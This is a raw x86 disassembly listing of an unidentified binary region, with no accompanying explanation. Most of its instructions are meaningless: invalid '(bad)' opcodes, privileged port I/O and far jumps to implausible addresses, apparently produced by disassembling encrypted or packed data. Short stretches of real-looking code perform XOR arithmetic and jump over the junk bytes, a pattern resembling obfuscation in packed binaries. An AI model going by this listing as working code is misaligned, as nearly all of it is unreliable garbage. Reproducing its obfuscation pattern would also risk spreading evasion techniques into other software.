  40a8e5:	fld    st(0)
  40a8e7:	in     eax,0x54
  40a8e9:	dec    esi
  40a8ea:	pop    ds
  40a8eb:	add    al,0xba
  40a8ed:	scas   al,BYTE PTR es:[edi]
  40a8ee:	jl     0x40a964
  40a8f0:	cwde   
  40a8f1:	add    ecx,ebp
  40a8f3:	mov    ebx,0x534f1810
  40a8f8:	push   ecx
  40a8f9:	cld    
  40a8fa:	xor    eax,0x63b88ec
  40a8ff:	dec    eax
  40a900:	and    DWORD PTR [edi],0x51a8f4bc
  40a906:	call   0x43e4:0x2e4df2d2
  40a90d:	and    BYTE PTR [eax+esi*2-0x2898a70d],al
  40a914:	mov    ds:0xe1538eb3,al
  40a919:	and    eax,0x26bebea9
  40a91e:	inc    ebp
  40a91f:	push   0x20886635
  40a924:	fbstp  TBYTE PTR [ecx]
  40a926:	xor    al,0x1
  40a928:	je     0x40a947
  40a92a:	jmp    0x40a98f
  40a92c:	lock rol BYTE PTR [ebx-0x3d],cl
  40a930:	test   eax,0xbbb89234
  40a935:	(bad)  
  40a936:	icebp  
  40a937:	fyl2x  
  40a939:	ins    BYTE PTR es:[edi],dx
  40a93a:	outs   dx,DWORD PTR ds:[esi]
  40a93b:	add    eax,0x6fd323cf
  40a940:	push   ss
  40a941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a942:	mov    bl,0x34
  40a944:	rcr    DWORD PTR [ebx-0x7509d582],1
  40a94a:	loope  0x40a8f9
  40a94c:	js     0x40a8ce
  40a94e:	sti    
  40a94f:	std    
  40a950:	xor    ecx,edi
  40a952:	cmp    eax,0x32e1ec8a
  40a957:	cwde   
  40a958:	xchg   edi,eax
  40a959:	mov    DWORD PTR [ebx-0x18f86aa2],esp
  40a95f:	hlt    
  40a960:	mov    BYTE PTR [eax],dh
  40a962:	jecxz  0x40a972
  40a964:	inc    eax
  40a965:	add    esi,edi
  40a967:	cmp    eax,0x1a913221
  40a96c:	cwde   
  40a96d:	pusha  
  40a96e:	cs addr16 jae 0x40a971
  40a972:	clc    
  40a973:	mov    ah,0xaa
  40a975:	popf   
  40a976:	inc    eax
  40a977:	les    esp,FWORD PTR [ebx+ecx*2+0x32]
  40a97b:	mov    dl,BYTE PTR [edi-0x1f067778]
  40a981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a982:	mov    ch,0xe5
  40a984:	pusha  
  40a985:	out    dx,eax
  40a986:	(bad)  
  40a987:	repz das 
  40a989:	sahf   
  40a98a:	mov    eax,0x15c28f7f
  40a98f:	icebp  
  40a990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a991:	cmp    DWORD PTR ds:0x9ae3c73f,eax
  40a997:	sbb    DWORD PTR [edi],ebp
  40a999:	push   ds
  40a99a:	in     al,0xe2
  40a99c:	inc    esi
  40a99d:	inc    BYTE PTR [edi]
  40a99f:	mov    ebx,0x876613b7
  40a9a4:	cmc    
  40a9a5:	and    BYTE PTR [edi+edi*8],ah
  40a9a8:	xor    BYTE PTR [edx+0x34a1e76c],bl
  40a9ae:	loopne 0x40a9e1
  40a9b0:	icebp  
  40a9b1:	fcmovu st,st(1)
  40a9b3:	(bad)  
  40a9b4:	xor    bh,al
  40a9b6:	fsubr  QWORD PTR [esi]
  40a9b8:	rcl    DWORD PTR es:[ebp+0x72516886],0xc6
  40a9c0:	and    DWORD PTR [esi],0x22547a04
  40a9c6:	aaa    
  40a9c7:	repz imul esp,DWORD PTR [ebp-0x2d],0x65
  40a9cc:	dec    esi
  40a9cd:	lahf   
  40a9ce:	xor    BYTE PTR [eax+eiz*8+0x798f79ac],bh
  40a9d5:	ret    
  40a9d6:	inc    ebp
  40a9d7:	in     eax,dx
  40a9d8:	ins    BYTE PTR es:[edi],dx
  40a9d9:	test   al,0x97
  40a9db:	dec    edi
  40a9dc:	push   ss
  40a9dd:	mov    ?,esp
  40a9df:	out    0xf4,eax
  40a9e1:	test   BYTE PTR [ebp-0x5e],dl
  40a9e4:	call   0x254a:0x26c94dad
  40a9eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ec:	(bad)  
  40a9ed:	sbb    al,0x94
  40a9f0:	jg     0x40aa0d
  40a9f2:	add    BYTE PTR [esi+0x1c2caa29],ch
  40a9f8:	jge    0x40a99f
  40a9fa:	scas   eax,DWORD PTR es:[edi]
  40a9fb:	fs sub eax,0xdeb7c536
  40aa01:	into   
  40aa02:	push   ecx
  40aa03:	cmp    bl,ch
  40aa05:	add    bh,BYTE PTR [edx]
  40aa07:	out    0x10,al
  40aa09:	xchg   esi,eax
  40aa0a:	xchg   edi,eax
  40aa0b:	mov    edi,0x165e875a
  40aa10:	arpl   WORD PTR [ecx-0x52],dx
  40aa13:	inc    edi
  40aa14:	mov    BYTE PTR [esi+eiz*8-0x18],dl
  40aa18:	outs   dx,DWORD PTR ds:[esi]
  40aa19:	into   
  40aa1a:	iret   
  40aa1b:	(bad)  
  40aa1d:	pop    ss
  40aa1e:	push   0x302a12a5
  40aa23:	push   ebx
  40aa24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa25:	pop    edx
  40aa26:	hlt    
  40aa27:	cmp    eax,0xfc45c729
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e7e2,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x4305da,0x42e7e2
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e7da,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x4305d6,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	sbb    dh,BYTE PTR [ebx]
  40aa9f:	pop    esi
  40aaa0:	xor    BYTE PTR [ebx-0x13],0x7e
  40aaa4:	jle    0x40ab02
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aa6e
  40aaaa:	arpl   WORD PTR [edx*1-0x363cc249],dx
  40aab1:	shl    DWORD PTR [ebx-0x5b],0x7a
  40aab5:	mov    esi,0x9b713fa0
  40aaba:	mov    WORD PTR [esi],ss
  40aabc:	xor    eax,0x651ae526
  40aac1:	mov    edi,0xf916f59b
  40aac6:	jns    0x40aad1
  40aac8:	xchg   esp,eax
  40aac9:	call   0x29e7:0x47972355
  40aad0:	ret    0x1296
  40aad3:	into   
  40aad4:	and    eax,DWORD PTR [edi+0x9]
  40aad7:	cmp    eax,0x8dfff7b0
  40aadc:	repz and al,0x1
  40aadf:	push   ecx
  40aae0:	fnstsw WORD PTR [ebp+0xc]
  40aae3:	adc    DWORD PTR [ebx+0x0],ebp
  40aae6:	stos   BYTE PTR es:[edi],al
  40aae7:	sbb    BYTE PTR [ebx+ecx*1+0x79],bl
  40aaeb:	push   edx
  40aaec:	aas    
  40aaed:	ficomp DWORD PTR [ebp+0x4]
  40aaf0:	dec    esi
  40aaf1:	fbld   TBYTE PTR [ecx]
  40aaf3:	jbe    0x40aaf0
  40aaf5:	adc    eax,DWORD PTR [ecx]
  40aaf7:	fs nop
  40aaf9:	lock push es
  40aafb:	lock sub eax,ebx
  40aafe:	jo     0x40ab7f
  40ab00:	xchg   edx,eax
  40ab01:	push   es
  40ab02:	jmp    0x40aa89
  40ab04:	add    dh,BYTE PTR [edx]
  40ab06:	jmp    0xf303ebcb
  40ab0b:	lods   al,BYTE PTR ds:[esi]
  40ab0c:	hlt    
  40ab0d:	dec    edi
  40ab0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab0f:	mov    cs,esp
  40ab11:	rol    ebp,1
  40ab13:	lea    ebx,[ebx+eax*8+0x1c]
  40ab17:	aas    
  40ab18:	mov    BYTE PTR [ebx+0x786aa374],0xa5
  40ab1f:	pushf  
  40ab20:	cmp    bl,0x1c
  40ab23:	fnstenv [ebx-0x54]
  40ab26:	mov    ah,0xac
  40ab28:	mov    ebp,0x8729e909
  40ab2d:	outs   dx,DWORD PTR ds:[esi]
  40ab2e:	sar    eax,1
  40ab30:	xor    DWORD PTR [edi],esp
  40ab32:	rol    bh,cl
  40ab34:	call   0xa8cc:0x79cc4527
  40ab3b:	mov    BYTE PTR [edx],dh
  40ab3d:	pop    ebp
  40ab3e:	int    0x4e
  40ab40:	fbld   TBYTE PTR [edi-0x57]
  40ab43:	cwde   
  40ab44:	ss jp  0x40ab34
  40ab47:	outs   dx,BYTE PTR ds:[esi]
  40ab48:	or     eax,0x84ae5b94
  40ab4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab4e:	pop    ss
  40ab4f:	add    DWORD PTR [esi+0x57],ebp
  40ab52:	jp     0x40ab2b
  40ab54:	dec    ecx
  40ab55:	add    al,0x80
  40ab57:	imul   eax,esp,0x69
  40ab5a:	les    edx,FWORD PTR [esi-0x3b]
  40ab5d:	test   BYTE PTR [ecx+0x6f302d23],al
  40ab63:	pop    edi
  40ab64:	or     DWORD PTR [eax],ecx
  40ab66:	and    BYTE PTR [esi],dl
  40ab68:	mov    ss,WORD PTR [ebx+0x6b]
  40ab6b:	addr16 dec esi
  40ab6d:	sti    
  40ab6e:	jge    0x40aaf6
  40ab70:	pop    ebp
  40ab71:	sub    DWORD PTR [edi],0x8e22c39
  40ab77:	mov    esi,0x8c381754
  40ab7c:	mov    ds:0x8d67e272,al
  40ab81:	(bad)  
  40ab83:	adc    ecx,esi
  40ab85:	(bad)  
  40ab86:	imul   esi,DWORD PTR ds:0x94427354,0xffffffd5
  40ab8d:	jnp    0x40ab24
  40ab8f:	xchg   esi,eax
  40ab90:	ds push edi
  40ab92:	push   ebp
  40ab93:	xor    eax,0x802a94b6
  40ab98:	js     0x40abf9
  40ab9a:	jns    0x40abe6
  40ab9c:	adc    eax,0x6f1d10cf
  40aba1:	retf   0x52e2
  40aba4:	retf   
  40aba5:	cwde   
  40aba6:	jp     0x40abc5
  40aba8:	jno    0x40ab39
  40abaa:	push   ds
  40abab:	js     0x40ab66
  40abad:	cmc    
  40abae:	iret   
  40abaf:	cmp    ch,BYTE PTR [esi+0x3b]
  40abb2:	in     al,0x4b
  40abb4:	inc    ebx
  40abb5:	icebp  
  40abb6:	mov    esp,0xfca886ac
  40abbb:	pushf  
  40abbc:	(bad)  
  40abbd:	xor    al,BYTE PTR [ebx+0x2cac96da]
  40abc3:	and    ecx,ebx
  40abc5:	dec    ecx
  40abc6:	dec    edx
  40abc7:	enter  0x1137,0x6d
  40abcb:	lods   eax,DWORD PTR ds:[esi]
  40abcc:	mov    ebp,0x987e1920
  40abd1:	inc    ebx
  40abd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abd3:	cli    
  40abd4:	ffreep st(5)
  40abd6:	or     al,0xae
  40abd8:	cli    
  40abd9:	inc    esp
  40abda:	push   cs
  40abdb:	mov    eax,0x6414f1ca
  40abe0:	aam    0xd3
  40abe2:	sub    edi,ebp
  40abe4:	pop    edx
  40abe5:	sbb    eax,DWORD PTR [ebp+0x411fe5f9]
  40abeb:	mov    eax,ds:0x9701322b
  40abf0:	lods   al,BYTE PTR ds:[esi]
  40abf1:	int3   
  40abf2:	mov    al,ds:0xa0a7977e
  40abf7:	xor    eax,0x74b41f51
  40abfc:	xchg   ecx,eax
  40abfd:	push   ss
  40abfe:	popf   
  40abff:	mov    ebp,0x43c7835a
  40ac04:	or     dh,BYTE PTR [esi+0x5f66c207]
  40ac0a:	mov    fs,WORD PTR [edx+0xaca700e]
  40ac10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac11:	lods   al,BYTE PTR ds:[esi]
  40ac12:	jmp    0xfaa0506e
  40ac17:	mov    BYTE PTR [edx-0x5ead8537],ch
  40ac1d:	out    dx,eax
  40ac1e:	and    dh,BYTE PTR [edx-0x53112abf]
  40ac24:	stos   BYTE PTR es:[edi],al
  40ac25:	mov    ecx,0x666628ac
  40ac2a:	push   ecx
  40ac2b:	xor    eax,0x93ee8eae
  40ac30:	mov    DWORD PTR [esp+ebp*2+0x6bd14e1b],edx
  40ac37:	js     0x40ac82
  40ac39:	push   ss
  40ac3a:	out    dx,eax
  40ac3b:	jl     0x40ac0d
  40ac3d:	or     al,0x22
  40ac3f:	cli    
  40ac40:	xlat   BYTE PTR ds:[ebx]
  40ac41:	or     al,0x2e
  40ac43:	mov    al,0xf9
  40ac45:	inc    edx
  40ac46:	into   
  40ac47:	icebp  
  40ac48:	scas   al,BYTE PTR es:[edi]
  40ac49:	inc    ecx
  40ac4a:	jmp    0xbc7d:0xc73d7a9f
  40ac51:	dec    ecx
  40ac52:	cmc    
  40ac53:	test   BYTE PTR [ecx+ebp*8+0x77b674b9],dl
  40ac5a:	cmp    eax,0xe7a15aaf
  40ac5f:	or     eax,0xf9760e59
  40ac64:	fstp   TBYTE PTR [esi]
  40ac66:	test   DWORD PTR [ebp+0x77],esp
  40ac69:	ss mov edi,0xfcf7325b
  40ac6f:	jle    0x40ac95
  40ac71:	add    dh,al
  40ac73:	dec    edx
  40ac74:	pop    ebp
  40ac75:	sbb    al,0x34
  40ac77:	test   al,0xf3
  40ac79:	outs   dx,DWORD PTR ds:[esi]
  40ac7a:	inc    edi
  40ac7b:	ss mov ebp,0x5daf8798
  40ac81:	into   
  40ac82:	hlt    
  40ac83:	shl    BYTE PTR [edx],0xb4
  40ac86:	pop    eax
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xe4011c02
  40aca1:	jp     0x40acf4
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40acfe
  40acab:	mov    bl,0xd2
  40acad:	nop
  40acae:	xchg   esp,eax
  40acaf:	xor    BYTE PTR [edx+ecx*4+0x5c04d7b9],dh
  40acb6:	mov    edx,0xa4703ed3
  40acbb:	xchg   eax,ebp
  40acbd:	xlat   BYTE PTR ds:[ebx]
  40acbe:	std    
  40acbf:	es push cs
  40acc1:	pop    ecx
  40acc2:	shr    DWORD PTR [edi+eax*8-0x11],0xa2
  40acc7:	cmp    al,0x17
  40acc9:	mov    ah,0x33
  40accb:	sub    al,BYTE PTR [eax+0x3d]
  40acce:	mov    ah,0xb9
  40acd0:	stc    
  40acd1:	xchg   edx,eax
  40acd2:	push   ebp
  40acd3:	test   BYTE PTR [eax-0x474b6745],dl
  40acd9:	scas   eax,DWORD PTR es:[edi]
  40acda:	mov    DWORD PTR [edx-0x66],0xbeae452e
  40ace1:	mov    WORD PTR [edi],cs
  40ace3:	call   0x2488cccb
  40ace8:	(bad)  
  40ace9:	ins    DWORD PTR es:[edi],dx
  40acea:	jge    0x40ac6d
  40acec:	pop    eax
  40aced:	call   esi
  40acef:	(bad)  
  40acf0:	mov    bh,0x9
  40acf2:	push   0x4224dd52
  40acf7:	mov    ss,edi
  40acf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acfa:	fwait
  40acfb:	xor    al,0xd4
  40acfd:	xchg   esp,eax
  40acfe:	icebp  
  40acff:	lock mov DWORD PTR ds:0x146adc3e,ecx
  40ad06:	dec    ebx
  40ad07:	aam    0xa
  40ad09:	test   eax,0xb49042b7
  40ad0e:	or     eax,0xf9866b7f
  40ad13:	inc    ebp
  40ad14:	int3   
  40ad15:	ss jae 0x40acb7
  40ad18:	and    edx,edi
  40ad1a:	shr    BYTE PTR [eax],cl
  40ad1c:	repnz mov ds:0x2429559,eax
  40ad22:	jne    0x40ad4e
  40ad24:	nop
  40ad25:	ins    DWORD PTR es:[edi],dx
  40ad26:	adc    DWORD PTR [ecx+0x4f31a702],eax
  40ad2c:	bound  ebp,QWORD PTR [ebp+0xb]
  40ad2f:	push   eax
  40ad30:	ret    
  40ad31:	mov    ds:0xa927e3c3,eax
  40ad36:	(bad)  
  40ad37:	push   edx
  40ad38:	jns    0x40ad3a
  40ad3a:	cmp    bl,BYTE PTR ds:0x2b352608
  40ad40:	push   eax
  40ad41:	and    dl,BYTE PTR [ebp+eiz*2-0x4b3f3ae8]
  40ad48:	lods   eax,DWORD PTR ds:[esi]
  40ad49:	pop    edx
  40ad4a:	js     0x40ad99
  40ad4c:	out    0xed,eax
  40ad4e:	cmp    BYTE PTR [edi-0x20229d6e],0x8f
  40ad55:	imul   eax,ebx,0x61210b08
  40ad5b:	(bad)  
  40ad5c:	jmp    FWORD PTR [edi+edi*4+0x4e]
  40ad60:	pop    DWORD PTR [ecx]
  40ad62:	or     BYTE PTR [eax-0x3696202],dh
  40ad68:	inc    eax
  40ad69:	addr16 jp 0x40ad27
  40ad6c:	adc    ebp,DWORD PTR [edi-0x165fd8c9]
  40ad72:	xlat   BYTE PTR ds:[ebx]
  40ad73:	nop
  40ad74:	mov    DWORD PTR [ebp-0x70],ebx
  40ad77:	and    ebx,esp
  40ad79:	or     al,0xc5
  40ad7b:	xchg   ecx,eax
  40ad7c:	xor    al,0xd2
  40ad7e:	je     0x40ad96
  40ad80:	js     0x40add3
  40ad82:	inc    esi
  40ad83:	push   eax
  40ad84:	lds    edi,FWORD PTR [edx]
  40ad86:	repnz sbb ah,bl
  40ad89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8a:	aaa    
  40ad8b:	adc    DWORD PTR [ecx+0x43],0xfc9ec3b8
  40ad92:	sub    ecx,DWORD PTR [ebp+0xc5a864d]
  40ad98:	idiv   bl
  40ad9a:	stc    
  40ad9b:	(bad)  
  40ad9d:	pop    ecx
  40ad9e:	push   ecx
  40ad9f:	jbe    0x40ade6
  40ada1:	stos   DWORD PTR es:[edi],eax
  40ada2:	or     al,0x3d
  40ada4:	int3   
  40ada5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada6:	add    edx,DWORD PTR [esi-0x6703a37c]
  40adac:	outs   dx,BYTE PTR ds:[esi]
  40adad:	jb     0x40ad35
  40adaf:	push   ss
  40adb0:	adc    eax,0x286c74db
  40adb5:	pop    es
  40adb6:	daa    
  40adb7:	shr    BYTE PTR [ebx+ecx*1+0x52],0x8c
  40adbc:	pushf  
  40adbd:	ins    DWORD PTR es:[edi],dx
  40adbe:	ds addr16 push es
  40adc1:	xchg   ebp,eax
  40adc2:	test   BYTE PTR [edi-0x2c],0xb7
  40adc6:	jbe    0x40ae07
  40adc8:	cmp    DWORD PTR [edx-0x2375578f],edi
  40adce:	push   esi
  40adcf:	aaa    
  40add0:	inc    ecx
  40add1:	fst    DWORD PTR [eax+eax*4]
  40add4:	xor    ecx,DWORD PTR [edi+0x7c1d86ca]
  40adda:	test   edx,edi
  40addc:	fidivr DWORD PTR [ecx]
  40adde:	ffreep st(4)
  40ade0:	jmp    0x5477d35f
  40ade5:	ja     0x40ad8d
  40ade7:	out    dx,eax
  40ade8:	cmc    
  40ade9:	pop    ecx
  40adea:	xchg   BYTE PTR [ebx-0x4b],ah
  40aded:	inc    ebp
  40adee:	push   ecx
  40adef:	test   DWORD PTR [ebx],esp
  40adf1:	push   ebx
  40adf2:	ficom  WORD PTR [ecx+0x3011cb31]
  40adf8:	test   al,0x74
  40adfa:	nop
  40adfb:	div    BYTE PTR [esp+edi*2]
  40adfe:	cmp    esi,DWORD PTR ds:0x1815e84e
  40ae04:	cmp    edx,eax
  40ae06:	pusha  
  40ae07:	xor    al,0xe7
  40ae09:	or     BYTE PTR [ebx-0x14282165],0x75
  40ae10:	adc    BYTE PTR [edx],ch
  40ae12:	xor    al,0x4c
  40ae14:	adc    eax,0x8d62925e
  40ae19:	jl     0x40adcb
  40ae1b:	add    eax,0x1adb84aa
  40ae20:	scas   al,BYTE PTR es:[edi]
  40ae21:	mov    ebp,0x22df4d
  40ae26:	popa   
  40ae27:	aad    0x47
  40ae29:	loopne 0x40add4
  40ae2b:	inc    edi
  40ae2c:	scas   al,BYTE PTR es:[edi]
  40ae2d:	cmp    BYTE PTR [edi-0x8],cl
  40ae30:	and    esp,DWORD PTR [ebp+0x46500f73]
  40ae36:	inc    eax
  40ae37:	adc    ah,0x3b
  40ae3a:	test   BYTE PTR ds:0x7f4b5caa,ch
  40ae40:	xor    al,0x9e
  40ae42:	mov    ecx,0x5091a5b
  40ae47:	pop    ecx
  40ae48:	mov    eax,fs
  40ae4a:	push   esi
  40ae4b:	aas    
  40ae4c:	jl     0x40ae30
  40ae4e:	int3   
  40ae4f:	fcmovb st,st(1)
  40ae51:	retf   0x18cd
  40ae54:	loope  0x40ae66
  40ae56:	sbb    eax,0x2cf82a02
  40ae5b:	jmp    0x4e77:0x3b26dc5a
  40ae62:	setg   BYTE PTR [esi]
  40ae65:	sbb    DWORD PTR ds:0x4a23680e,esp
  40ae6b:	jg     0x40ae99
  40ae6d:	add    al,0x99
  40ae6f:	sbb    eax,0xd77c3e58
  40ae74:	mov    edi,0x426fb91c
  40ae79:	test   BYTE PTR [ecx+0x4359642f],0x52
  40ae80:	mov    dh,0x30
  40ae82:	gs repz push esi
  40ae85:	sub    DWORD PTR [edx-0x5],ecx
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock adc eax,0xbfb031aa
  40aeb7:	loopne 0x40af37
  40aeb9:	jle    0x40af17
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aef6
  40aebf:	lods   eax,DWORD PTR ds:[esi]
  40aec0:	mov    edx,0x5e4c288d
  40aec5:	push   ecx
  40aec6:	daa    
  40aec7:	pop    es
  40aec8:	rcl    DWORD PTR [ebx+0x195af5c8],0xfe
  40aecf:	pop    edi
  40aed0:	mov    dl,0x54
  40aed2:	ffree  st(2)
  40aed4:	mov    cl,0x13
  40aed6:	scas   al,BYTE PTR es:[edi]
  40aed7:	or     al,0x2c
  40aed9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40aedb:	stc    
  40aedc:	mov    ds:0x82cf3371,eax
  40aee1:	retf   0x32ae
  40aee4:	push   0x18ed5716
  40aee9:	dec    ebp
  40aeea:	dec    esp
  40aeeb:	fmul   QWORD PTR [edx]
  40aeed:	pop    eax
  40aeee:	repnz dec eax
  40aef0:	sahf   
  40aef1:	fucomi st,st(6)
  40aef3:	sub    ah,bh
  40aef5:	cwde   
  40aef6:	add    al,0xa
  40aef8:	mov    ebx,0x42e02d75
  40aefd:	cli    
  40aefe:	fsubr  DWORD PTR [ebx]
  40af00:	push   esi
  40af01:	sti    
  40af02:	scas   al,BYTE PTR es:[edi]
  40af03:	std    
  40af04:	enter  0x1068,0x4c
  40af08:	sub    dh,BYTE PTR [eax+eax*8-0x56b40b0b]
  40af0f:	mov    ebp,0xeb38fb55
  40af14:	ret    
  40af15:	leave  
  40af16:	sub    DWORD PTR [edx+0x61225bb0],ebx
  40af1c:	add    BYTE PTR [ecx],bl
  40af1e:	lods   al,BYTE PTR ds:[esi]
  40af1f:	test   ah,bl
  40af21:	hlt    
  40af22:	and    DWORD PTR [eax],0xffffffeb
  40af25:	in     eax,0x26
  40af27:	ja     0x40af48
  40af29:	and    BYTE PTR [edi-0x64348823],0x18
  40af30:	adc    esi,DWORD PTR [esi]
  40af32:	(bad)  
  40af33:	(bad)  
  40af34:	call   0x3e81b21c
  40af39:	imul   eax,DWORD PTR [esi+0x45],0x9b29a197
  40af40:	sbb    ch,dh
  40af42:	mov    ch,0xe9
  40af44:	pop    es
  40af45:	inc    edi
  40af46:	and    cl,cl
  40af48:	adc    dl,bh
  40af4a:	xchg   DWORD PTR [ecx],esp
  40af4c:	or     al,0x77
  40af4e:	mov    ebp,0x5fbfc5b3
  40af53:	push   ebx
  40af54:	pop    eax
  40af55:	jp     0x40af8f
  40af57:	mov    WORD PTR ds:0x42f0fade,?
  40af5d:	mov    bl,0x4c
  40af5f:	out    0x83,al
  40af61:	pushf  
  40af62:	xor    DWORD PTR [edx+eiz*1-0x6e79d0e9],eax
  40af69:	and    ch,bh
  40af6b:	sub    BYTE PTR [edi-0x5c],bh
  40af6e:	and    BYTE PTR gs:[ecx+0x73],cl
  40af72:	sub    cl,BYTE PTR [edi+0x1fefcfe1]
  40af78:	push   es
  40af79:	jns    0x40aff3
  40af7b:	outs   dx,BYTE PTR ds:[esi]
  40af7c:	sub    al,0x83
  40af7e:	lahf   
  40af7f:	adc    ah,BYTE PTR [edi+0x79]
  40af82:	pop    esi
  40af83:	adc    dl,BYTE PTR [esi+0x1abb3b5a]
  40af89:	pop    edi
  40af8a:	ja     0x40afe6
  40af8c:	pop    esp
  40af8d:	jle    0x40af2c
  40af8f:	rep lods al,BYTE PTR ds:[esi]
  40af91:	and    al,0xcd
  40af93:	inc    esp
  40af94:	dec    ecx
  40af95:	pop    edi
  40af96:	les    edx,FWORD PTR [edx]
  40af98:	sub    BYTE PTR [edx],al
  40af9a:	fisubr WORD PTR [ebp+0x31e4cc20]
  40afa0:	mov    eax,0x9f7194f8
  40afa5:	pop    edx
  40afa6:	hlt    
  40afa7:	lods   eax,DWORD PTR ds:[esi]
  40afa8:	add    DWORD PTR [edx+edx*4+0x45],ebp
  40afac:	arpl   WORD PTR [eax],ax
  40afae:	sahf   
  40afaf:	repnz call 0xa344:0x8cd2c1db
  40afb7:	outs   dx,DWORD PTR ds:[esi]
  40afb8:	push   esp
  40afb9:	jg     0x40afd7
  40afbb:	hlt    
  40afbc:	jmp    0x40b032
  40afbe:	adc    cl,BYTE PTR [ebx]
  40afc0:	mov    BYTE PTR [edi],bh
  40afc2:	sbb    BYTE PTR [ebp+0x75ba4a49],ch
  40afc8:	imul   ecx,eax,0xab1dc848
  40afce:	cmp    DWORD PTR [esi+0x14],eax
  40afd1:	cmp    al,0xce
  40afd3:	rol    BYTE PTR [edi-0x2c0f0ddf],cl
  40afd9:	int3   
  40afda:	cs stc 
  40afdc:	cmp    BYTE PTR [ebp-0x63],ch
  40afdf:	out    dx,eax
  40afe0:	(bad)  
  40afe1:	mov    dh,0xa3
  40afe3:	fisub  WORD PTR [esi]
  40afe5:	cwde   
  40afe6:	adc    BYTE PTR [eax-0x61],al
  40afe9:	icebp  
  40afea:	push   edi
  40afeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afec:	lahf   
  40afed:	adc    edx,DWORD PTR [ebx+0x55b50af0]
  40aff3:	xchg   esi,eax
  40aff4:	ret    
  40aff5:	dec    ebp
  40aff6:	push   ecx
  40aff7:	out    dx,al
  40aff8:	int    0xf4
  40affa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40affb:	(bad)  
  40affc:	mov    bh,0xe2
  40affe:	cmp    DWORD PTR [eax-0x5f],eax
  40b001:	jl     0x40af89
  40b003:	fild   WORD PTR [edi+0x2f]
  40b006:	(bad)  
  40b007:	cld    
  40b008:	es cwde 
  40b00a:	call   0x7db8:0x6c8d9b16
  40b011:	or     al,0x3b
  40b013:	or     eax,0x6032d86e
  40b018:	int3   
  40b019:	lea    ebp,[esi-0x18]
  40b01c:	retf   0x2df9
  40b01f:	icebp  
  40b020:	call   FWORD PTR [ecx-0x11]
  40b023:	out    0xe0,eax
  40b025:	mov    ah,0x69
  40b027:	fiadd  WORD PTR [edi+0x5f336283]
  40b02d:	dec    ebp
  40b02e:	test   al,0xa3
  40b030:	adc    eax,0x550072a
  40b035:	inc    ecx
  40b036:	sub    BYTE PTR [edi],cl
  40b038:	xchg   esp,eax
  40b039:	and    al,ch
  40b03b:	fiadd  WORD PTR [ecx+ecx*2+0x1e]
  40b03f:	jge    0x40b01c
  40b041:	adc    ch,BYTE PTR [ecx-0x51]
  40b044:	jno    0x40b077
  40b046:	stos   BYTE PTR es:[edi],al
  40b047:	dec    edi
  40b048:	int    0x1b
  40b04a:	retf   
  40b04b:	mov    al,ds:0x81296769
  40b050:	arpl   sp,cx
  40b052:	add    edi,eax
  40b054:	test   al,0x8
  40b056:	mov    eax,ds:0xcce2c6a6
  40b05b:	(bad)  
  40b05c:	in     al,0xb
  40b05e:	jno    0x40b03d
  40b060:	les    edi,FWORD PTR [edx-0x3489f646]
  40b066:	out    0x4b,al
  40b068:	jmp    0x40b042
